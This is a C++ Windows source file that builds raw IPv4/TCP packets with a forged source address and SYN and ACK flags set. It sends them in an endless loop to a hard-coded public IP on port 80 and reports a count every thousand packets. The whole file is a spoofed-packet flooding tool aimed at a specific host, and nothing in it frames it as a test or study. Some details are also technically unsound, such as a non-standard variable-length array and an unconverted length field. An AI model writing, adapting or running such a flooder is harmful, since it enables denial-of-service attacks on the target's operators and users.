#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

struct iphdr {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint8_t  doff:4, reserved:4;
    uint8_t  fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

unsigned short checksum(void *buf, int len) {
    unsigned short *data = (unsigned short *)buf;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *data++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)data;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

int main() {
    WSADATA wsaData;
    SOCKET sockfd;
    SOCKADDR_IN dest;
    char packet[4096];

    memset(packet, 0, 4096);

    iphdr *iph = (iphdr *)packet;
    
    tcphdr *tcph = (tcphdr *)(packet + sizeof(iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(iphdr) + sizeof(tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.1");
    iph->daddr = inet_addr("123.60.188.246");

    iph->check = checksum((unsigned short *)packet, iph->tot_len);

    tcph->source = htons(12345);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    struct pseudo_header {
        uint32_t source_address;
        uint32_t dest_address;
        uint8_t  placeholder;
        uint8_t  protocol;
        uint16_t tcp_length;
    };

    pseudo_header psh;
    psh.source_address = inet_addr("192.168.1.1");
    psh.dest_address = inet_addr("123.60.188.246");
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(tcphdr));

    int psize = sizeof(pseudo_header) + sizeof(tcphdr);
    char pseudogram[psize];

    memcpy(pseudogram, &psh, sizeof(pseudo_header));
    memcpy(pseudogram + sizeof(pseudo_header), tcph, sizeof(tcphdr));

    tcph->check = checksum((unsigned short *)pseudogram, psize);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return 1;
    }

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return 1;
    }
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("123.60.188.246");
    int pkg = 0;
    while(1>0){
	    if (sendto(sockfd, packet, iph->tot_len, 0, (SOCKADDR *)&dest, sizeof(dest)) == SOCKET_ERROR) {
	        //std::cerr << "Send failed." << std::endl;
	    } else {
	        //std::cout << "Packet sent successfully." << std::endl;
	        pkg++;
	        if(pkg%1000==0){
	        	printf("pkg send %8d\n",pkg);
			}
	    }    	
	}

    closesocket(sockfd);
    WSACleanup();
    return 0;
}
